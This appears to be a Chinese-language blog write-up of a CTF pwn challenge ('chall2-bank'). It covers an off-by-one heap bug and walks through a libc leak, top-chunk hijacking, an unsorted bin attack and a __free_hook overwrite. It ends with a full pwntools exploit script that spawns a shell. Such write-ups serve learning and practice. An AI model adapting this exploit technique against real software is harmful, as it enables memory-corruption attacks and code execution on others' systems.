---
title: hack it ctf (2)
date: 2018-10-11 00:00:00
categories:
- CTF/Pwn
tags:  Pwn
---

## chall2-bank

这道题目真的快烦死我了。。。

```
  if ( i <= 19 )
  {
    v3 = (struct bank *)malloc(0x28uLL);
    v3->flag = (__int64)&magic;
    LODWORD(v3->size) = 16;
    printf("Enter title of bank account: ");
    read(0, v3->title, 0x11uLL);
    printf("Enter size of your bank statement: ", v3->title);
    fflush(stdout);
    scanf("%d\n", &n);
    fflush(stdout);
    if ( n + 8 > 0x70 )
    {
      puts("Only fast allowed");
      exit(0);
    }
```

漏洞点就是有个offbyone，烦人的地方就是他在mallochokk那里有个check函数

```
__int64 check()
{
  __int64 result; // rax
  signed int i; // [rsp+4h] [rbp-Ch]

  for ( i = 0; i <= 19; ++i )
  {
    if ( heaplst[i] && **heaplst[i] != 0x60C0C748 )
    {
      puts("LOL you are bankrupt");
      exit(0);
    }
  }
  result = *(_QWORD *)dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "__malloc_hook");
  if ( result )
    exit(0);
  return result;
}
```

然后只能用fastbin

```
 if ( n + 8 > 0x70 )
    {
      puts("Only fast allowed");
      exit(0);
    }
    if ( n <= 0 )
      exit(0);
    v3->statement = (__int64)malloc(n + 8);
    fgets((char *)v3->statement, n, stdin);
    heaplst[i] = (_DWORD **)v3;
    printf("Account has been created at index %d\n", (unsigned int)i);
  }
```

### leak地址

这个没什么好说的，注意一下堆风水就好了

### get shell

因为看了别人的wp都是orange做的，然后flag是freehook相关，所以说尝试了一下改freehook

我真的是闲的。。

#### 劫持topchunk

main_arena 伪造一个假的头部，之后劫持topchunk

#### 伪造topsize

其实常规做法不需要伪造的，直接在前边比较远的一个偏移用那个数就行，但是这道题。。。只能用fastbin而且还有个数限制。。。

所以利用了一下unsortedbin attack，这里要注意一下的是有些地址像文件结构哪里不要写东西，会报错，直接在freehook前边第一个hook那里写就好了

#### exp

```
from pwn import *
context.log_level = 'debug'

io = process('./chall2-bank')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def p():
	gdb.attach(io)
	raw_input()
def choice(c):
	io.recvuntil('status\n')
	io.sendline(str(c))
def add(title,sz,content, p =False):
	choice(1)
	io.recvuntil('account:')
	io.sendline(title)
	io.recvuntil('statement:')
	io.sendline(str(sz))
	if not p:
		io.send(content)
def edit_tit(tit,idx):
	choice(2)
	io.recvuntil(':')
	io.sendline(str(idx))
	io.sendline(tit)
def edit_sta(content,idx):
	choice(3)
	io.recvuntil(':')
	io.sendline(str(idx))
	io.sendline(content)
def delete(idx):
	choice(4)
	io.recvuntil(':')
	io.sendline(str(idx))
def show(idx):
	choice(5)
	io.recvuntil(':')
	io.sendline(str(idx))

def main():
	add('AAA',0x20,'A'*0x1f)#0
	delete(0)
	add('AAA',0x60,'A'*0x5f)#0
	add('B'*0x10 + '\xe1',0x60,'B'*0x5f)#1
	add('CCC',0x20,'C'*0x1f)#2
	delete(0)
	add('AAA',0x60,'/bin/sh\x00' +'\n')#0
	show(1)
	io.recvuntil('Statement: ')
	leak = u64(io.recv(6).ljust(8,'\x00'))
	log.success(hex(leak))
	libc_base = leak - 0x10 - 0x58 - libc.symbols['__malloc_hook']
	system = libc_base + libc.symbols['system']
	free_hook = libc_base + libc.symbols['__free_hook']
	target = free_hook - 0x8
	delete(2)

	add('DDD',0x60,'D'*0x5f + '\n')#2 statement is same with 1
	add('AAA',0x60,'/bin/sh\x00\n')#3
	delete(3)
	delete(2)
	show(1)
	io.recvuntil('Statement: ')
	leak = u64(io.recv(6).ljust(8,'\x00'))
	heap_base = leak - 0x1a0
	log.success(hex(heap_base))
	add('DDD',0x60,'D'*0x5f + '\n')#2 statement is same with 1
	add('AAA',0x60,'/bin/sh\x00\n')#3
	delete(2)
	delete(3)
	delete(1)
	fake = heap_base + 0x1e0
	payload = '/bin/sh\x00'.ljust(0x30,'A') + p64(0) + p64(0x71) +p64(0x61)
	add('BBB',0x60,p64(fake)*2 + '\n')#1
	add('AAA',0x60,payload +'\n')#2
	add('DDD',0x60,'D'*0x5f)#3

	add('FFF',0x60,'F'*0x20 + '\n')#4
	fake = libc_base + libc.symbols['__malloc_hook'] + 0x10 +0x28
	log.success(hex(fake))

	add('XXX',0x20,'X'*0x1f)#5
	delete(5)
	add('YYY',0x50,'Y'*0x4f)#5
	add('Z'*0x10 + '\xc1',0x50,'Z'*0x4f)#6
	add('OOO',0x20,'O'*0x1f)#7
	delete(5)
	add('YYY',0x50,'Y'*0x4f)#5
	delete(7)
	add('WWW',0x50,'W'*0x4f)#7 is same with 6

	add('padding',0x20,'X'*0x1f)#8
	add('XXX',0x20,'X'*0x1f)#9
	delete(9)
	add('AAA',0x40,'A'*0x3f)#9
	add('B'*0x10 + '\xd1',0x40,'B'*0x3f)#10
	add('padding',0x20,'X'*0x1f)#11
	delete(9)
	delete(10)
	add('AAA',0x68,'A'*0x40 + p64(0) + p64(0x51) + p64(0) + '\n')#10
	add('BBB',0x40,'B'*0x20 + p64(0) + p64(0x51) +p64(target - 0x10  )+ p64(target -0x10 )[:7])#11

	delete(11)
	log.success(hex(target - 8))
	add('CCC',0x40,'aaa\n')#12

	delete(7)
	delete(5)
	delete(6)
	add('ZZZ',0x50,p64(fake)*2 + '\n')#5
	add('YYY',0x50,'YYY\n')#6
	add('XXX',0x50,'XXX\n')#7
	payload = p64(0)*4 + p64(target - 8)  + p64(libc_base + libc.symbols['__malloc_hook'] + 0x10 +0x58) * 3+ '\n'
	add('HHH',0x50,payload)#8
	delete(8)
	add('shell',0x68,p64(system) * 2 +'\n')
	delete(0)
	io.interactive()

if __name__ == '__main__':
	main()
```

### 遇到的一些问题总结

1.freehook 前边有一个iofilelock的指针，看起来像是可以像mallochook一样构造堆头的，但是那个地址运行起来就消失不见了，所以不行。

2.在利用完unsortedbin attack之后注意维护好unsortedbin指针，不然不能从topchunk分配内存

3.可能我是少数的用预期解做出来的，但是这种俄罗斯套娃题目真的是。。。心累